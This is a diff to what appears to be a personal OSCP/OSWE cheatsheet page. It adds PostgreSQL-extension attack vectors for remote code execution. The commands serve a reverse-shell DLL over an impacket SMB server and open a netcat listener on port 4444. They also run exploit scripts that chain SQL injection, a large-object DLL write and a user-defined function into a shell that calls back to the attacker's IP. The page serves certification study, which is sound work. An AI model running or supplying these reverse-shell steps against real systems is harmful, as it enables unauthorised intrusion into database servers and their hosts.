@@ -171,13 +171,22 @@
 <img src="./OSCP%20personal%20cheatsheet_files/procmon.png">
 </code></pre></div></div>
 <hr>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>### Attack vector: PostgreSQL Extensions
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>### Attack vector 2: PostgreSQL Extensions
+(Condition: In the same network)
+
 # Attacker: host smbserver contains rev_shell.dll file
     sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali ~/Desktop/OffSec/OSWE/Weapons/
     nc -lnvp 4444
     python2 postgresql_extension_rce.py 192.168.192.113:8443 192.168.45.181 4444
     (may need to change the IP of remote smb server in postgresql_extension_rce.py)
 
+</code></pre></div></div>
+<hr>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>### Attack vector 3: PostgreSQL Extensions conjunction with Large Object: SQLi -> write binary file (dll) -> create/call User Define Function -> shell
+(No need to be in the same network)
+
+nc -lnvp 4444
+python2 postgresql_extension_rce_with_large_object.py 192.168.192.113:8443 192.168.45.181 4444
 </code></pre></div></div>
 <!-- END -->
 <hr>
